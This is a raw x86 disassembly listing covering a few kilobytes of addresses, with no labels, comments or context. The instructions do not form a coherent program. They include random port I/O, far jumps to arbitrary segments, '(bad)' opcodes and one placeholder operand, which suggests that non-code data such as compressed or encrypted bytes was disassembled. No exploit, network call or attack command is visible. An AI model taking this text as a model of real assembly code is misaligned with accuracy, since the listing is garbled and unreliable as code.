  41ef64:	cmp    BYTE PTR [edi-0x5ae7cf4a],dh
  41ef6a:	push   0x1b
  41ef6c:	pop    esp
  41ef6d:	jmp    0xa8e810f5
  41ef72:	push   eax
  41ef73:	inc    edx
  41ef74:	adc    eax,0x713f46d0
  41ef79:	out    0x25,al
  41ef7b:	xchg   edi,eax
  41ef7c:	dec    edi
  41ef7d:	cmp    ebx,DWORD PTR [ebx-0x21ef245e]
  41ef83:	xchg   esi,eax
  41ef84:	add    DWORD PTR [esi-0x21f55fa1],edi
  41ef8a:	out    0xf8,al
  41ef8c:	lods   al,BYTE PTR ds:[esi]
  41ef8d:	inc    ebp
  41ef8e:	sbb    DWORD PTR [esi+0x0],esp
	...
  41eff1:	add    BYTE PTR [eax],al
  41eff3:	add    BYTE PTR [ecx-0xda40a3],bh
  41eff9:	out    0xbb,eax
  41effb:	fisttp QWORD PTR [ecx+0x0]
  41effe:	lock imul edi,edi,0x67
  41f002:	push   es
  41f003:	nop
  41f004:	mov    ah,0x49
  41f006:	add    DWORD PTR [eax],eax
  41f008:	add    al,0x1
  41f00a:	add    BYTE PTR [eax],al
  41f00c:	in     al,0x3e
  41f00e:	cmp    esp,DWORD PTR [edi+0x6d]
  41f011:	add    DWORD PTR [edx+esi*4+0x4300d82f],eax
  41f018:	pusha  
  41f019:	in     eax,0xdf
  41f01b:	test   DWORD PTR [eax],ebp
  41f01d:	mov    edx,DWORD PTR [esi+0x1556c685]
  41f023:	fs loopne 0x41f05e
  41f026:	dec    esi
  41f027:	mov    al,ds:0x3bec3aa5
  41f02c:	or     BYTE PTR [ecx+0x55],0xf2
  41f030:	jp     0x41f03b
  41f032:	sar    BYTE PTR [eax],1
  41f034:	adc    al,0x9d
  41f036:	aam    0x17
  41f038:	or     BYTE PTR [edi+eax*8+0x15],0xed
  41f03d:	ror    BYTE PTR [edx],0x3c
  41f040:	or     bl,BYTE PTR [esi+0x23]
  41f043:	pushf  
  41f044:	inc    ecx
  41f045:	mov    WORD PTR [edx+0x1b],?
  41f048:	mov    ebp,DWORD PTR [ebx-0x2c]
  41f04b:	push   esp
  41f04c:	or     DWORD PTR [ebx-0x5163c7a4],edx
  41f052:	sub    al,0xf2
  41f054:	mov    ebx,0x24352eab
  41f059:	int    0x2d
  41f05b:	add    eax,0x8b545a8
  41f060:	enter  0xa073,0xf4
  41f064:	push   cs
  41f065:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f066:	fld    TBYTE PTR [edi-0x37]
  41f069:	and    BYTE PTR [esi+eiz*4+0xfa16ab3],al
  41f070:	adc    edx,0xc3ecdf69
  41f076:	dec    eax
  41f077:	sbb    DWORD PTR [ebx],edi
  41f079:	push   ss
  41f07a:	cdq    
  41f07b:	mov    esi,0x28b7235e
  41f080:	dec    esp
  41f081:	fadd   st,st(2)
  41f083:	retf   
  41f084:	test   al,0xbd
  41f086:	pop    edx
  41f087:	cmp    edx,DWORD PTR [edi]
  41f089:	(bad)  
  41f08a:	test   al,0x6b
  41f08c:	out    0x5e,eax
  41f08e:	mov    BYTE PTR [ebx+ebp*2+0x57],dh
  41f092:	or     BYTE PTR [ebx+edi*4],0x21
  41f096:	sub    dl,BYTE PTR [ebx+0x22]
  41f099:	sub    BYTE PTR [edi-0x506ce08a],ch
  41f09f:	imul   edi,DWORD PTR [edx+0x3d],0x64257e41
  41f0a6:	in     al,0x9b
  41f0a8:	js     0x41f061
  41f0aa:	or     al,0x71
  41f0ac:	call   0x6d05:0xc4887697
  41f0b3:	loopne 0x41f0b4
  41f0b5:	das    
  41f0b6:	mov    dh,0x5f
  41f0b8:	daa    
  41f0b9:	lds    ecx,FWORD PTR [ecx]
  41f0bb:	aas    
  41f0bc:	mov    dl,0x7e
  41f0be:	xchg   edx,eax
  41f0bf:	mov    ds:0xb9d18770,al
  41f0c4:	stc    
  41f0c5:	mov    al,0x9f
  41f0c7:	xchg   esi,eax
  41f0c8:	jnp    0x41f0cd
  41f0ca:	popf   
  41f0cb:	mov    DWORD PTR [edx],esi
  41f0cd:	fsub   DWORD PTR [ebp-0x56777570]
  41f0d3:	mov    ecx,0x5aabdab4
  41f0d8:	imul   esi,DWORD PTR [ecx+0x19e0c142],0xffffffc0
  41f0df:	cmp    BYTE PTR [ecx-0x4d2d23e6],cl
  41f0e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f0e6:	push   cs
  41f0e7:	jle    0x41f133
  41f0e9:	popf   
  41f0ea:	sahf   
  41f0eb:	pop    ebp
  41f0ec:	xchg   ebx,eax
  41f0ed:	(bad)  
  41f0ee:	repz xchg edx,eax
  41f0f0:	adc    al,dl
  41f0f2:	mov    WORD PTR [esi+ebx*8-0x5d],cs
  41f0f6:	sub    al,0x98
  41f0f8:	rcr    BYTE PTR [esi-0x6277b292],cl
  41f0fe:	mov    esp,0xd717a0c2
  41f103:	sbb    al,0x8
  41f105:	add    DWORD PTR [edx],esp
  41f107:	xchg   BYTE PTR [esp+ebx*1],dl
  41f10a:	xor    eax,0x8e1b51fe
  41f10f:	xor    BYTE PTR [eax],al
	...
  41f171:	add    BYTE PTR [eax],al
  41f173:	add    BYTE PTR [ebx+0x6c2a6cdf],bl
  41f179:	mov    ebx,0x3824ffdf
  41f17e:	(bad)  
  41f17f:	jmp    0x4ab8:0xe1b2cce5
  41f186:	add    DWORD PTR [eax],eax
  41f188:	add    al,0x1
  41f18a:	add    BYTE PTR [eax],al
  41f18c:	fs scas eax,DWORD PTR es:[edi]
  41f18e:	jnp    0x41f181
  41f190:	ror    DWORD PTR [eax+0x78],cl
  41f193:	xchg   BYTE PTR [esp+edx*4],dh
  41f196:	loope  0x41f195
  41f198:	inc    edx
  41f199:	pop    eax
  41f19a:	xchg   edx,eax
  41f19b:	push   es
  41f19c:	nop
  41f19d:	adc    al,0xaf
  41f19f:	lds    edi,FWORD PTR ds:0xf43b38f
  41f1a5:	and    BYTE PTR [ebp+ecx*2+0x22695dd3],bl
  41f1ac:	mov    ch,0x97
  41f1ae:	leave  
  41f1af:	cdq    
  41f1b0:	push   es
  41f1b1:	nop
  41f1b2:	xchg   al,cl
  41f1b4:	dec    edi
  41f1b5:	lds    esp,FWORD PTR [eax-0x5c46909c]
  41f1bb:	dec    edx
  41f1bc:	and    esp,DWORD PTR [eax+0x7b]
  41f1bf:	aam    0xed
  41f1c1:	mov    ecx,0x3812742b
  41f1c6:	push   esp
  41f1c7:	int3   
  41f1c8:	mov    al,0x21
  41f1ca:	add    BYTE PTR [edx+0x20],al
  41f1cd:	shl    BYTE PTR [ebp+0x24],0xb7
  41f1d1:	mov    edi,0x1686eeb7
  41f1d6:	and    dl,BYTE PTR [ebp+esi*4-0x71]
  41f1da:	pop    ebp
  41f1db:	xchg   esi,eax
  41f1dc:	xchg   ebx,eax
  41f1dd:	ror    ebx,cl
  41f1df:	mov    al,ds:0x18a7429
  41f1e4:	push   DWORD PTR ss:[ecx]
  41f1e7:	dec    ebx
  41f1e8:	fdiv   QWORD PTR [edi]
  41f1ea:	and    esi,eax
  41f1ec:	jg     0x41f1e9
  41f1ee:	add    al,0x6c
  41f1f0:	pusha  
  41f1f1:	jne    0x41f251
  41f1f3:	cmp    esi,DWORD PTR [edx-0x4f]
  41f1f6:	xchg   edx,eax
  41f1f7:	or     al,0xda
  41f1f9:	out    dx,eax
  41f1fa:	fidivr WORD PTR [esi+ecx*1-0x6e2c97bf]
  41f201:	add    eax,0xe8535d09
  41f206:	repz sbb ch,BYTE PTR [ebp+0x622da2da]
  41f20d:	leave  
  41f20e:	pop    ds
  41f20f:	call   0xeb7c:0x8b23a25f
  41f216:	push   esi
  41f217:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f218:	ret    0x31c0
  41f21b:	mov    ecx,0xe5f0b9e0
  41f220:	jp     0x41f296
  41f222:	dec    edx
  41f223:	adc    bl,BYTE PTR [ecx+edx*1-0x5e]
  41f227:	imul   edx,DWORD PTR [ebx+0x48],0x73
  41f22b:	xor    esi,edx
  41f22d:	ja     0x41f2a2
  41f22f:	js     0x41f2a1
  41f231:	push   edi
  41f232:	pop    ecx
  41f233:	stos   BYTE PTR es:[edi],al
  41f234:	add    al,0x7e
  41f236:	xchg   esi,eax
  41f237:	xchg   edi,eax
  41f238:	call   0x65f03173
  41f23d:	xor    edx,ebp
  41f23f:	mov    dl,0x23
  41f241:	in     al,0x50
  41f243:	fsubr  DWORD PTR [edx+0x40]
  41f246:	ret    0x39a9
  41f249:	mov    edx,DWORD PTR [ebx-0x3e]
  41f24c:	jae    0x41f1db
  41f24e:	add    eax,0x9d54e34
  41f253:	mov    ah,0x4
  41f255:	aad    0x12
  41f257:	fnstcw WORD PTR [ebx+edi*4]
  41f25a:	loope  0x41f22d
  41f25c:	jecxz  0x41f2a5
  41f25e:	sbb    BYTE PTR [ebp+0x66c7d30f],0xcf
  41f265:	xchg   ebx,eax
  41f266:	inc    edi
  41f267:	xchg   ebp,eax
  41f268:	fwait
  41f269:	adc    bh,al
  41f26b:	and    al,0x77
  41f26d:	mov    edi,0x9161ef9d
  41f272:	xor    al,0xc1
  41f274:	mov    bl,0xf6
  41f276:	icebp  
  41f277:	ss popa 
  41f279:	ins    BYTE PTR es:[edi],dx
  41f27a:	daa    
  41f27b:	inc    edx
  41f27c:	aad    0x1e
  41f27e:	lds    esp,FWORD PTR [ebx+0x6c]
  41f281:	fiadd  DWORD PTR [esi+0x69]
  41f284:	mov    ds:0xbe31c284,al
  41f289:	fld    DWORD PTR [eax-0xc]
  41f28c:	add    dh,BYTE PTR [ebp+0xede0]
	...
  41f2f2:	add    BYTE PTR [eax],al
  41f2f4:	push   ecx
  41f2f5:	sbb    edi,edi
  41f2f7:	jmp    si
  41f2fa:	fnstcw WORD PTR [edi]
  41f2fc:	jo     0x41f2eb
  41f2fe:	sahf   
  41f2ff:	jb     0x41f35f
  41f301:	adc    al,0xa0
  41f303:	imul   edi,DWORD PTR [ebx+ecx*2+0x1040001],0x17dd0000
  41f30e:	adc    al,0x7b
  41f310:	iret   
  41f311:	jmp    0xf92a:0xcbc01b80
  41f318:	inc    esp
  41f319:	xchg   dh,ah
  41f31b:	push   edi
  41f31c:	(bad)  
  41f31d:	and    al,0x4e
  41f31f:	cwde   
  41f320:	sub    al,0xb0
  41f322:	mov    al,0xfd
  41f324:	cdq    
  41f325:	mov    ds:0xa43381da,al
  41f32a:	pop    ss
  41f32b:	lea    esi,[ebx]
  41f32d:	out    0xf4,al
  41f32f:	lea    esi,[ebx+ebx*8+0xf486db]
  41f336:	dec    edi
  41f337:	jg     0x41f38c
  41f339:	xchg   BYTE PTR [ebx],bl
  41f33b:	arpl   WORD PTR [eax],bx
  41f33d:	icebp  
  41f33e:	nop
  41f33f:	cmp    BYTE PTR [ebp+0x13],ch
  41f342:	out    dx,eax
  41f343:	stc    
  41f344:	arpl   si,di
  41f346:	or     al,BYTE PTR [ecx+ebp*8+0x4841eb9c]
  41f34d:	mov    ebp,0xd89ae397
  41f352:	push   edi
  41f353:	mov    dh,0x3a
  41f355:	xchg   ecx,eax
  41f356:	push   edi
  41f357:	sub    al,0xc0
  41f359:	stos   BYTE PTR es:[edi],al
  41f35a:	rcl    BYTE PTR [eax-0x7c],0x40
  41f35e:	es push es
  41f360:	psubsb mm1,mm5
  41f363:	repz dec ebp
  41f365:	cld    
  41f366:	push   ds
  41f367:	and    WORD PTR [edi-0x133cef97],bp
  41f36e:	pop    esi
  41f36f:	mov    cs,ebp
  41f371:	sbb    BYTE PTR [edx-0x76],bl
  41f374:	add    al,0x56
  41f376:	mov    ebx,0x36afcc82
  41f37b:	pop    ebx
  41f37c:	ins    DWORD PTR es:[edi],dx
  41f37d:	pushf  
  41f37e:	gs jp  0x41f385
  41f381:	repz jne 0x41f339
  41f384:	stos   DWORD PTR es:[edi],eax
  41f385:	xor    DWORD PTR fs:[edi],0x16a90f5
  41f38c:	mov    dl,cl
  41f38e:	jl     0x41f39f
  41f390:	retf   
  41f391:	lock arpl WORD PTR [esi-0x6],bx
  41f395:	ret    0xf971
  41f398:	adc    eax,0x9e99d330
  41f39d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f39e:	stos   DWORD PTR es:[edi],eax
  41f39f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f3a0:	push   eax
  41f3a1:	jno    0x41f41c
  41f3a3:	aaa    
  41f3a4:	mov    al,ds:0x9d6945e8
  41f3a9:	cmp    al,0x17
  41f3ab:	adc    dh,BYTE PTR [ebx+0x2]
  41f3ae:	adc    al,0xaa
  41f3b0:	jl     0x41f342
  41f3b2:	bound  edi,QWORD PTR [ebp-0x19]
  41f3b5:	pop    eax
  41f3b6:	dec    esp
  41f3b7:	fwait
  41f3b8:	ret    0x36c1
  41f3bb:	mov    cl,0xe8
  41f3bd:	jmp    0xe19f3b4e
  41f3c2:	repnz push ds
  41f3c4:	xor    BYTE PTR [eax-0xda9917b],0x39
  41f3cb:	gs sahf 
  41f3cd:	bound  esi,QWORD PTR [esi+esi*2]
  41f3d0:	cld    
  41f3d1:	sbb    DWORD PTR [ebx],eax
  41f3d3:	jmp    0x99b7:0x27c3e861
  41f3da:	jmp    0x41f3cc
  41f3dc:	test   BYTE PTR [di-0x5b],0x62
  41f3e1:	fstp   QWORD PTR ds:0x502f450f
  41f3e7:	cmp    DWORD PTR [ebp+ecx*8-0x71],0xffffffac
  41f3ec:	punpckldq mm0,DWORD PTR [esi+ebp*2]
  41f3f0:	jo     0x41f3b1
  41f3f2:	cmp    ecx,DWORD PTR [edi+0x5a]
  41f3f5:	inc    ecx
  41f3f6:	push   ss
  41f3f7:	or     dl,BYTE PTR [eax-0x6349da53]
  41f3fd:	sbb    ecx,DWORD PTR [ecx]
  41f3ff:	out    0x91,al
  41f401:	sbb    al,0xf5
  41f403:	stos   BYTE PTR es:[edi],al
  41f404:	push   ebx
  41f405:	xor    BYTE PTR [esi],ch
  41f407:	sub    BYTE PTR [esi],dl
  41f409:	std    
  41f40a:	add    al,0xc7
  41f40c:	or     ebp,DWORD PTR [ebx+0x6886]
	...
  41f472:	add    BYTE PTR [eax],al
  41f474:	cmp    al,0xe7
  41f476:	imul   ebp,edi,0xfffffffb
  41f479:	out    dx,eax
  41f47a:	mov    esp,0xd5fd13f7
  41f47f:	mov    ch,0xe4
  41f481:	ins    BYTE PTR es:[edi],dx
  41f482:	and    eax,0x14cc0a4
  41f487:	add    BYTE PTR [ecx+eax*1],al
  41f48a:	add    BYTE PTR [eax],al
  41f48c:	aad    0x25
  41f48e:	add    dl,dh
  41f490:	lods   al,BYTE PTR ds:[esi]
  41f491:	xchg   esp,eax
  41f492:	pop    ebp
  41f493:	xor    ah,BYTE PTR [ebp-0x34]
  41f496:	add    cl,dl
  41f498:	or     DWORD PTR [ebx-0x5fc9902f],0x2f
  41f49f:	aad    0xb4
  41f4a1:	outs   dx,DWORD PTR ds:[esi]
  41f4a2:	shl    DWORD PTR [edx-0x2f],0xe9
  41f4a6:	pusha  
  41f4a7:	test   al,0xcf
  41f4a9:	mov    ah,0x9e
  41f4ab:	pop    eax
  41f4ac:	mov    ah,0xf6
  41f4ae:	test   bl,ch
  41f4b0:	jmp    0x41f481
  41f4b2:	daa    
  41f4b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f4b4:	ror    DWORD PTR [edx+0x42],1
  41f4b7:	pop    eax
  41f4b8:	adc    esp,DWORD PTR [esi+0x3]
  41f4bb:	sti    
  41f4bc:	jne    0x41f50e
  41f4be:	push   ecx
  41f4bf:	pop    edx
  41f4c0:	cmp    ecx,edx
  41f4c2:	aaa    
  41f4c3:	js     0x41f542
  41f4c5:	jbe    0x41f46b
  41f4c7:	sbb    dh,BYTE PTR [edi-0x31149fd9]
  41f4cd:	js     0x41f4fe
  41f4cf:	ror    BYTE PTR [edx],1
  41f4d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f4d2:	cmp    al,0xcd
  41f4d4:	aad    0xb2
  41f4d6:	mov    edx,0x545dbda8
  41f4db:	repnz push 0xe9818508
  41f4e1:	ins    BYTE PTR es:[edi],dx
  41f4e2:	stos   BYTE PTR es:[edi],al
  41f4e3:	cmp    eax,0xbffd6986
  41f4e8:	sbb    eax,0xcb96af18
  41f4ed:	pusha  
  41f4ee:	pop    esp
  41f4ef:	lods   al,BYTE PTR ds:[esi]
  41f4f0:	test   eax,0x3e6cb9b5
  41f4f5:	bound  esi,QWORD PTR [ebp+0x3268d00b]
  41f4fb:	ret    
  41f4fc:	cld    
  41f4fd:	jbe    0x41f4c0
  41f4ff:	into   
  41f500:	xlat   BYTE PTR ds:[ebx]
  41f501:	cmc    
  41f502:	and    eax,0x9e0b9afb
  41f507:	ret    0xe78b
  41f50a:	or     al,0x71
  41f50c:	xor    ebp,ecx
  41f50e:	sub    al,0x4
  41f510:	in     eax,dx
  41f511:	inc    eax
  41f512:	mov    ds,WORD PTR [edx]
  41f514:	fisubr WORD PTR [edx-0x36391d90]
  41f51a:	in     al,0x6c
  41f51c:	ins    BYTE PTR es:[edi],dx
  41f51d:	icebp  
  41f51e:	jmp    FWORD PTR [ebx]
  41f520:	jae    0x41f544
  41f522:	or     eax,0xd2c6db3d
  41f527:	push   edx
  41f528:	ins    DWORD PTR es:[edi],dx
  41f529:	push   ds
  41f52a:	out    dx,eax
  41f52b:	clc    
  41f52c:	lds    edi,FWORD PTR [esi+0x11]
  41f52f:	jne    0x41f579
  41f531:	mov    ds:0xf15bc134,eax
  41f536:	pop    es
  41f537:	sbb    eax,0x5ac6f541
  41f53c:	or     DWORD PTR [ebp-0x2c],eax
  41f53f:	dec    edi
  41f540:	mov    edx,DWORD PTR [ebx-0x42]
  41f543:	fs cmp eax,0x4ab51eb3
  41f549:	push   ebx
  41f54a:	jmp    0xc958:0x11232383
  41f551:	push   edx
  41f552:	mov    esi,0x281a1632
  41f557:	cs loop 0x41f536
  41f55a:	lahf   
  41f55b:	jo     0x41f57f
  41f55d:	enter  0xb767,0x8a
  41f561:	xlat   BYTE PTR ds:[ebx]
  41f562:	inc    ebx
  41f563:	stc    
  41f564:	jp     0x41f4fb
  41f566:	lahf   
  41f567:	hlt    
  41f568:	(bad)  
  41f56a:	out    0xed,al
  41f56c:	das    
  41f56d:	nop
  41f56e:	mov    WORD PTR ds:[ecx+0x6c],es
  41f572:	dec    eax
  41f573:	mov    edx,DWORD PTR [ebx]
  41f575:	fnstenv [eax]
  41f577:	push   ss
  41f578:	enter  0x351e,0xa6
  41f57c:	and    eax,0x406c4041
  41f581:	imul   edi,edi,0x102b6f1c
  41f587:	fmul   QWORD PTR [esi+0x5cfa1669]
  41f58d:	not    DWORD PTR [ebx-0x55]
	...
  41f5f4:	js     0x41f62a
  41f5f6:	add    bh,bl
  41f5f8:	dec    esi
  41f5f9:	(bad)  
  41f5fa:	stc    
  41f5fb:	mov    bh,0xb7
  41f5fd:	jmp    0x1108:0x22a8d422
  41f604:	les    ecx,FWORD PTR [ebp+0x1]
  41f607:	add    BYTE PTR [ecx+eax*1],al
  41f60a:	add    BYTE PTR [eax],al
  41f60c:	add    esi,ebx
  41f60e:	mov    ch,0xf6
  41f610:	add    DWORD PTR [edx+0x3b764d2a],edx
  41f616:	mov    eax,0xbf20bd1d
  41f61b:	fwait
  41f61c:	add    dl,BYTE PTR [edx-0x29]
  41f61f:	int    0xc5
  41f621:	adc    BYTE PTR [ebx],ch
  41f623:	push   ds
  41f624:	jmp    0x43b8:0x6c53
  41f62a:	push   edx
  41f62b:	stos   DWORD PTR es:[edi],eax
  41f62c:	imul   ecx,DWORD PTR [ebp+0x196dbbdd],0x5a
  41f633:	shr    ch,0xca
  41f636:	icebp  
  41f637:	aas    
  41f638:	mov    eax,ds:0x2258b9d9
  41f63d:	mov    eax,0x14c6025f
  41f642:	sbb    BYTE PTR [esp+edx*8-0x35],cl
  41f646:	ror    BYTE PTR [eax+0x34],0xaf
  41f64a:	push   ss
  41f64b:	push   cs
  41f64c:	jb     0x41f66a
  41f64e:	dec    edx
  41f64f:	add    DWORD PTR [ecx+0x3f19178d],eax
  41f655:	lahf   
  41f656:	ins    DWORD PTR es:[edi],dx
  41f657:	sbb    DWORD PTR [ebx-0x76],esi
  41f65a:	and    dl,BYTE PTR [edx+0x151d97f8]
  41f660:	mov    bl,0x9d
  41f662:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f664:	ins    BYTE PTR es:[edi],dx
  41f665:	dec    edx
  41f666:	or     al,0xd0
  41f668:	aaa    
  41f669:	mov    dl,0x55
  41f66b:	repz mov eax,ds:0x31faec5f
  41f671:	repz sub bh,bl
  41f674:	jne    0x41f614
  41f676:	jg     0x41f6af
  41f678:	mov    ds:0xf526c4ad,eax
  41f67d:	cmp    ah,BYTE PTR [ecx+ebx*8+0x4d]
  41f681:	ds dec edi
  41f683:	add    DWORD PTR [ebx-0x3e1a935f],edi
  41f689:	push   0xffffffa5
  41f68b:	push   ebp
  41f68c:	xor    ch,BYTE PTR [eax+0x3855aff8]
  41f692:	out    0x6d,al
  41f694:	sub    eax,0x542f1ce0
  41f699:	cld    
  41f69a:	arpl   WORD PTR [esi],ax
  41f69c:	pusha  
  41f69d:	out    dx,eax
  41f69e:	dec    ebp
  41f69f:	scas   eax,DWORD PTR es:[edi]
  41f6a0:	mov    edx,0xba2510f0
  41f6a5:	sub    esi,ecx
  41f6a7:	or     BYTE PTR [ecx+0x12cf20de],0xf0
  41f6ae:	sbb    al,0x99
  41f6b0:	mov    ebx,0x8dca0ee2
  41f6b5:	dec    ebp
  41f6b6:	xor    BYTE PTR [ebp+0x582676a1],cl
  41f6bc:	pop    ebx
  41f6bd:	cmc    
  41f6be:	adc    DWORD PTR [esi-0x17],ebp
  41f6c1:	mov    ds:0xad695f4e,al
  41f6c6:	xor    eax,0xd28a5b5d
  41f6cb:	mov    al,0x32
  41f6cd:	cmp    eax,0x9e376d87
  41f6d2:	stc    
  41f6d3:	aas    
  41f6d4:	pop    edi
  41f6d5:	stos   BYTE PTR es:[edi],al
  41f6d6:	scas   al,BYTE PTR es:[edi]
  41f6d7:	cmp    al,0x4a
  41f6d9:	aad    0xc3
  41f6db:	inc    eax
  41f6dc:	out    dx,al
  41f6dd:	xchg   ecx,eax
  41f6de:	clc    
  41f6df:	dec    edx
  41f6e0:	jp     0x41f71d
  41f6e2:	ss ret 0x43f6
  41f6e6:	je     0x41f66b
  41f6e8:	fwait
  41f6e9:	sti    
  41f6ea:	iret   
  41f6eb:	mov    al,0xa0
  41f6ed:	fnsave [edi+ecx*2-0x53]
  41f6f1:	inc    ecx
  41f6f2:	lahf   
  41f6f3:	pop    ds
  41f6f4:	(bad)  
  41f6f5:	xlat   BYTE PTR ds:[ebx]
  41f6f6:	leave  
  41f6f7:	mov    ebp,0x1bd660d0
  41f6fc:	sbb    eax,0x348a00
  41f701:	jge    0x41f733
  41f703:	(bad)  
  41f704:	hlt    
  41f705:	fst    DWORD PTR [ebx-0x19]
  41f708:	lea    esp,[ebp-0x380ed182]
  41f70e:	popf   
  41f70f:	sbb    al,0x0
	...
  41f771:	add    BYTE PTR [eax],al
  41f773:	add    BYTE PTR [edx-0x5081dcc4],dl
  41f779:	jg     0x41f75a
  41f77b:	cld    
  41f77c:	call   0xc7c7:0x176c62d2
  41f783:	add    cl,al
  41f785:	dec    esi
  41f786:	add    DWORD PTR [eax],eax
  41f788:	add    al,0x1
  41f78a:	add    BYTE PTR [eax],al
  41f78c:	dec    edi
  41f78d:	push   ebx
  41f78e:	ins    BYTE PTR es:[edi],dx
  41f78f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f790:	sbb    al,0xad
  41f792:	push   ebx
  41f793:	push   edi
  41f794:	or     esi,DWORD PTR [ebx-0x5e87a6b0]
  41f79a:	mov    ds:0x6a1dba16,eax
  41f79f:	push   esp
  41f7a0:	or     eax,0xf03bde15
  41f7a5:	cwde   
  41f7a6:	lods   al,BYTE PTR ds:[esi]
  41f7a7:	and    esi,DWORD PTR [ecx+esi*4-0x7d5b3acc]
  41f7ae:	shr    DWORD PTR [eax+0x3434e8be],0x72
  41f7b5:	lods   eax,DWORD PTR ds:[esi]
  41f7b6:	inc    ecx
  41f7b7:	ret    
  41f7b8:	lahf   
  41f7b9:	in     eax,dx
  41f7ba:	jmp    0x8ce2:0x8b204499
  41f7c1:	dec    ebp
  41f7c2:	push   0x23f323b0
  41f7c7:	pop    esp
  41f7c8:	das    
  41f7c9:	lods   al,BYTE PTR ds:[esi]
  41f7ca:	jb     0x41f78b
  41f7cc:	pop    ebp
  41f7cd:	dec    esp
  41f7ce:	test   al,0xa0
  41f7d0:	ror    DWORD PTR [ebx],0xfd
  41f7d3:	test   eax,0x8375fac9
  41f7d8:	dec    ebx
  41f7d9:	adc    BYTE PTR [edi-0x52d65b7c],0x85
  41f7e0:	jne    0x41f7ea
  41f7e2:	inc    edx
  41f7e3:	jl     0x41f78e
  41f7e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f7e6:	xor    al,0xc2
  41f7e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f7e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f7ea:	sbb    eax,0x2f976b68
  41f7ef:	pop    ss
  41f7f0:	repz mov ch,0xa1
  41f7f3:	enter  0xccc,0x4a
  41f7f7:	pop    ebx
  41f7f8:	loope  0x41f869
  41f7fa:	aad    0xcf
  41f7fc:	jp     0x41f81b
  41f7fe:	stos   BYTE PTR es:[edi],al
  41f7ff:	call   0x64e3:0x20fb0cb6
  41f806:	imul   esi,edx,0x260c38a
  41f80c:	scas   eax,DWORD PTR es:[edi]
  41f80d:	cdq    
  41f80e:	fldcw  WORD PTR [esi+edi*4-0x1]
  41f812:	shr    ecx,cl
  41f814:	fld    DWORD PTR [eax-0x4401ad71]
  41f81a:	push   esp
  41f81b:	cmova  ecx,DWORD PTR [ecx]
  41f81e:	jb     0x41f86d
  41f820:	jb     0x41f7ec
  41f822:	jnp    0x41f7c2
  41f824:	loopne 0x41f849
  41f826:	or     eax,edi
  41f828:	ins    BYTE PTR es:[edi],dx
  41f829:	ret    0x89ca
  41f82c:	inc    ebx
  41f82d:	sbb    eax,ecx
  41f82f:	loopne 0x41f82e
  41f831:	cmp    BYTE PTR [edi+eax*2],al
  41f834:	mov    cl,0xe8
  41f836:	imul   edi,DWORD PTR [ebp+0x6fc4db23],0xf131c5bd
  41f840:	push   0xffffffe8
  41f842:	xor    eax,0x8b1a973
  41f847:	xor    al,0x4d
  41f849:	rcr    DWORD PTR [ebp+0x38a25adb],0xf6
  41f850:	jp     0x41f7e6
  41f852:	jae    0x41f864
  41f854:	adc    BYTE PTR [esi+0x71],ah
  41f857:	iret   
  41f858:	test   eax,0xa530ce53
  41f85d:	repz sbb DWORD PTR [esi-0x3c],edx
  41f861:	xchg   esi,eax
  41f862:	sbb    eax,0x367d64f7
  41f867:	cmc    
  41f868:	outs   dx,BYTE PTR ds:[esi]
  41f869:	pop    edi
  41f86a:	add    DWORD PTR [ecx+0x112edafb],esp
  41f870:	(bad)  
  41f871:	pop    eax
  41f872:	leave  
  41f873:	lea    esi,[edx-0x12fb2c00]
  41f879:	adc    eax,ebp
  41f87b:	or     BYTE PTR [eax-0x30e0e31e],0xbe
  41f882:	test   dl,cl
  41f884:	add    eax,0x2e7cd253
  41f889:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f88a:	inc    ebp
  41f88b:	pop    edi
  41f88c:	(bad)  
  41f88d:	out    dx,al
  41f88e:	inc    ebp
  41f88f:	daa    
	...
  41f8f4:	mov    eax,ds:0x3b920b9a
  41f8f9:	xchg   ebx,eax
  41f8fa:	mov    ecx,0x4183febb
  41f8ff:	pop    edx
  41f900:	pop    esi
  41f901:	hlt    
  41f902:	iret   
  41f903:	(bad)  
  41f904:	int3   
  41f905:	dec    edi
  41f906:	add    DWORD PTR [eax],eax
  41f908:	add    al,0x1
  41f90a:	add    BYTE PTR [eax],al
  41f90c:	js     0x41f8bb
  41f90e:	int3   
  41f90f:	add    al,0xaa
  41f911:	pshufw mm6,QWORD PTR [eax],0x7c
  41f915:	push   DWORD PTR [ebp+0x65fb52a1]
  41f91b:	xor    DWORD PTR [esi+0x6580962b],ebx
  41f921:	outs   dx,BYTE PTR ds:[esi]
  41f922:	cmp    eax,0x10758523
  41f927:	out    0xae,eax
  41f929:	add    DWORD PTR [ecx-0x25],ebp
  41f92c:	jb     0x41f904
  41f92e:	or     DWORD PTR [edi],0xd442b516
  41f934:	mov    bl,0x9c
  41f936:	(bad)  
  41f937:	and    eax,0x7850631e
  41f93c:	or     DWORD PTR [edi+0x7f],ebp
  41f93f:	push   0x3f
  41f941:	nop
  41f942:	mov    esp,0x774af876
  41f947:	jo     0x41f971
  41f949:	add    DWORD PTR [edx+0xe],ebx
  41f94c:	mov    ah,0xb9
  41f94e:	cmc    
  41f94f:	pop    ecx
  41f950:	xrelease mov BYTE PTR [esi-0x6734ecf3],bh
  41f957:	adc    eax,0x431a9d73
  41f95c:	or     BYTE PTR [ecx+eax*4+0x7c],0x97
  41f961:	adc    DWORD PTR [edi],ecx
  41f963:	fsubrp st(6),st
  41f965:	in     eax,dx
  41f966:	mov    al,0x0
  41f968:	or     ebx,DWORD PTR [ecx-0x73]
  41f96b:	pop    ecx
  41f96c:	sbb    al,bh
  41f96e:	inc    eax
  41f96f:	sub    eax,DWORD PTR [edx+0xbae276b]
  41f975:	int    0xc2
  41f977:	xor    DWORD PTR [ecx],0x7d564b5c
  41f97d:	push   eax
  41f97e:	ror    BYTE PTR [edi-0x19],cl
